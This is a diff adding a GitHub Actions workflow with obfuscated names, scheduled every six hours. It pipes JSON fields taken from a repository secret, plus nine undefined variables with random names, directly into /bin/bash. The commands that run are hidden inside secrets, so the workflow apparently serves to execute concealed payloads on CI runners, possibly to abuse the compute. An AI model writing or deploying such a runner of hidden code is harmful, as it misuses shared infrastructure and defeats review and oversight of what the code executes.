@@ -1,0 +1,26 @@
+name: yilianrenzhendedazaijianbang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yilianrenzhendedazaijianbang
+        env:
+          zlifn89882: ${{ secrets.zlifn89882 }}
+        run: |
+          echo $zlifn89882 | jq -r .e253 | /bin/bash
+          echo $nm647 | jq -r .jqi406 | /bin/bash
+          echo $hwa55892 | jq -r .lmvrf20686 | /bin/bash
+          echo $fvbto68 | jq -r .zvfhv69 | /bin/bash
+          echo $hxay63 | jq -r .ui56 | /bin/bash
+          echo $ng71 | jq -r .hyt968 | /bin/bash
+          echo $vnwxb29 | jq -r .zrh24462 | /bin/bash
+          echo $ioso07 | jq -r .w9252 | /bin/bash
+          echo $reigr0 | jq -r .sv04349 | /bin/bash
+          echo $kzmn006 | jq -r .ob2 | /bin/bash
+
